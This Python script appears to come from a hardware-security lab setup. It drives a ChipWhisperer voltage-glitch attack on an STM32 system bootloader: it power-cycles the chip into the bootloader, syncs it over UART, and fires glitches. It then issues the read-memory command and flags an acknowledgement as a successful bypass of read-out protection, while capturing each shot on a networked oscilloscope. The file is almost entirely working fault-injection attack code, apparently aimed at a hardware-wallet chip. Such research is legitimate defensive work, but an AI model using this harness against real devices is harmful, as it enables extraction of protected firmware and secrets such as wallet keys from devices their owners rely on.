#!/usr/bin/env python3
"""One armed glitch shot with scope-first timing.

Order matters: CW opens FIRST (target power blips settle), then the scope
is armed over LAN, then the shot fires. Otherwise the scope's single
trigger catches the CW power-on transient instead of the glitch.

Run: /home/tdaly/.cwvenv/bin/python scope/glitch_shot.py [n_shots]
"""
import sys
import time

sys.path.insert(0, '/home/tdaly/trezor-btc/storage-sim')
sys.path.insert(0, '/home/tdaly/trezor-btc')

import serial                       # noqa: E402
import vxi11                        # noqa: E402
import test_pulse                   # noqa: E402  (setup_cw + constants)
from serialfind import find_ftdi    # noqa: E402

SCOPE_IP = '10.11.13.220'
GAP = 1.0            # s between shots (clear separation on the scope too)


def scope_setup_and_arm(inst, tdiv='100NS', trig='C1', trig_lv='0.5V'):
    inst.write('C1:VDIV 500MV')
    inst.write('C1:CPL D1M')
    inst.write('C2:VDIV 20MV')          # UART tap is heavily attenuated
    inst.write('C2:CPL D1M')
    inst.write(f'TDIV {tdiv}')
    if trig == 'C2':                    # trigger on the UART start bit
        inst.write('TRSE EDGE,SR,C2,LT,OFF')
        inst.write('C2:TRSL NEG')
        inst.write(f'C2:TRLV {trig_lv}')
    else:                              # trigger on the glitch dip: event
        inst.write('TRDL 0S')          # lands dead-center in the window
        inst.write('C1:TRSL NEG')
        inst.write('TRSE EDGE,SR,C1,LT,OFF')
        inst.write(f'C1:TRLV {trig_lv}')
    inst.write('TRMD SINGLE')
    time.sleep(0.3)
    for c in ('C1:VDIV?', 'TDIV?', 'C1:TRSL?', 'C1:TRLV?', 'TRMD?'):
        print(f'  {c:12s} {inst.ask(c).strip()}')
    print('[+] scope armed (SINGLE)')


def grab(inst, tag):
    mode = inst.ask('TRMD?').strip()
    print(f'  TRMD -> {mode}')
    raw = inst.ask_raw(b'SCDP')
    png = f'/tmp/opencode/scope_{tag}.bmp'
    with open(png, 'wb') as f:
        f.write(raw)
    inst.write('C1:WF? DAT2')
    wf = inst.read_raw()
    with open(f'/tmp/opencode/scope_{tag}_c1.bin', 'wb') as f:
        f.write(wf)
    inst.write('C2:WF? DAT2')
    wf2 = inst.read_raw()
    with open(f'/tmp/opencode/scope_{tag}_c2.bin', 'wb') as f:
        f.write(wf2)
    print(f'  screen -> {png} ({len(raw)} B); wf1 {len(wf)} B; wf2 {len(wf2)} B')
    return mode


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 3
    if len(sys.argv) > 3:
        test_pulse.WIDTH, test_pulse.REP = int(sys.argv[2]), int(sys.argv[3])
        print(f'[+] using width {test_pulse.WIDTH}, repeat {test_pulse.REP}')
    tdiv = sys.argv[4] if len(sys.argv) > 4 else '100NS'
    outmode = sys.argv[5] if len(sys.argv) > 5 else 'enable_only'
    # 1. CW first (power settles here, BEFORE the scope is armed)
    test_pulse.MODE = 'ext_single'      # it reads argv[1] at import - override
    cw = test_pulse.setup_cw()
    cw.glitch.trigger_src = 'ext_single'
    cw.trigger.triggers = 'tio3'
    cw.adc.basic_mode = 'rising_edge'
    if outmode != 'enable_only':
        cw.glitch.output = outmode
        print(f'[+] glitch output mode: {outmode}')

    # 1b. boot into the system bootloader: full power cycle with BOOT0
    #     (TIO1) held high - the only boot path verified on this rig
    cw.io.tio1 = True          # BOOT0 high
    cw.io.tio2 = 'high_z'
    cw.io.target_pwr = False
    time.sleep(1.5)
    cw.io.target_pwr = True
    time.sleep(2.5)
    print('[+] power-cycled with BOOT0 high - system bootloader up')

    ser = serial.Serial(find_ftdi(), 115200, bytesize=8, parity='E',
                        stopbits=1, timeout=0.2)
    time.sleep(0.5)

    # sync the bootloader first (0x7F -> ACK 0x79), else resp is meaningless
    synced = False
    for _ in range(10):
        ser.reset_input_buffer()
        ser.write(b'\x7f')
        r = ser.read(4)
        if r and 0x79 in r:
            synced = True
            break
        time.sleep(0.05)
    print(f'[+] bootloader sync: {"OK" if synced else "FAILED"}')

    # 2. scope arm
    inst = vxi11.Instrument(SCOPE_IP)
    scope_setup_and_arm(inst, tdiv)

    # 3. fire
    for i in range(n):
        cw.arm()
        time.sleep(0.02)
        ser.reset_input_buffer()
        ser.write(b'\x11\xee')
        r = ser.read(8)
        print(f'  shot {i+1}: resp={r.hex() if r else "(none)"}')
        # readmem probe in-session: NACK = alive&locked, ACK = GLITCH WIN
        time.sleep(0.3)
        ser.reset_input_buffer()
        ser.write(b'\x11\xee')
        r2 = ser.read(4)
        print(f'         readmem probe: '
              f'{"*** ACK 0x79 - GLITCH WORKED ***" if 0x79 in r2 else r2.hex() if r2 else "(none)"}')
        mode = inst.ask('TRMD?').strip()
        print(f'         TRMD after shot: {mode}')
        if 'STOP' in mode:
            print('  -> caught it, grabbing screen')
            grab(inst, f'shot{i+1}')
            # aliveness: same-session 0x7F re-sync
            time.sleep(0.2)
            ser.reset_input_buffer()
            ser.write(b'\x7f')
            r = ser.read(4)
            print(f'  chip after glitch: '
                  f'{"ALIVE (0x79)" if r and 0x79 in r else f"dead/no-ack {r.hex() if r else ""}"}')
            break
        time.sleep(GAP)

    ser.close()
    cw.dis()
    del cw
    inst.close()
    print('[+] done')


if __name__ == '__main__':
    main()
